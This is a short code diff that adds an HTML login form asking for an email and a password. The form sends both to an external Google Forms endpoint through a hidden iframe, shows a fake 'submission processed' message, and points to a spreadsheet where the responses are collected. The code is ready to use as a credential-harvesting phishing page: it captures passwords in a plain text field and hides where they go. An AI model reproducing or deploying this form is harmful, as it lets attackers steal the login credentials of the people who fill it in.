@@ -1,0 +1,18 @@
+<form name="gform" id="gform" enctype="text/plain" action="https://docs.google.com/forms/d/e/1FAIpQLSdFevWAtV6elDRUlga1VoFyBRs37xQnhsdpsU4AsuSbCrMs4Q/formResponse?"target="hidden_iframe" onsubmit= "submitted=true;">
+  Email:<br>
+  <input type="text" name="entry.226776576" id="entry.226776576"><br>
+  password:<br>
+  <input type="text" name="entry.2145474059" id="entry.2145474059">
+  <input type="submit" value="Submit">
+</form>
+<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) {}"></iframe>
+<script src="assets/js/jquery.min.js"></script>
+<script type="text/javascript">var submitted=false;</script>
+<script type="text/javascript">
+$('#gform').on('submit', function(e) {
+  $('#gform *').fadeOut(2000);
+  $('#gform').prepend('Your submission has been processed...');
+  });
+</script>
+<!--<iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdFevWAtV6elDRUlga1VoFyBRs37xQnhsdpsU4AsuSbCrMs4Q/viewform?embedded=true" width="700" height="520" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>-->
+<!--https://docs.google.com/spreadsheets/d/1l2wyNSyeZJEoEsjAA_KNzqhn6pNZNC5meLiPjAPpzs0/edit?usp=sharing-->
